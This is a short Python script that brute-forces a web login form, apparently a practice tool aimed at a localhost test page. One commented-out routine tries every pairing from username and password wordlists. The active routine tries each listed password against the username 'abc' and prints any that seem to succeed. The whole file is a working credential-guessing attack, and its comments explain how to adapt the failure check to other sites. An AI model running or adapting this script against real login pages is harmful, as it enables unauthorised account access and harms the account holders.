#!/usr/bin/env python
import requests

target = "http://127.0.0.1/testscriptlogin/index.php"
#-----------------------------------------------------------------------
#way_1     2 list of username and password
# def login(usr, passwd):
#     response = requests.post(target, data={
#         "user": usr,
#         "password": passwd,
#         "submit":"submit"
#     })
#     if 'no' not in response.text:                                      # change 'no' to 'login failed' or whatever
#         print('Username:Password --> {}:{}'.format(usr,passwd))
#
# username_arr = []
# password_arr = []
#
# with open("usernameList.txt", "r") as usernamelistFile:
#     for line in usernamelistFile:
#         word_username = line.strip()
#         username_arr.append(word_username)
# with open("passwordList.txt", "r") as passwordlistFile:
#     for line in passwordlistFile:
#         word_password = line.strip()
#         password_arr.append(word_password)
#
# for username in username_arr:
#     for password in password_arr:
#         login(username, password)

#------------------------------------------------------------------
##way_2      list of username or password
def login(usr, passwd):
    response = requests.post(target, data={
        "user": usr,
        "password": passwd,
        "submit":"submit"
    })
    if 'no' not in response.text:                                  # change 'no' to 'login failed' or whatever
        print('Password --> {}'.format(passwd))
with open("passwordList.txt", "r") as passwordlistFile:
    for line in passwordlistFile:
        word_password = line.strip()
        login('abc', word_password)
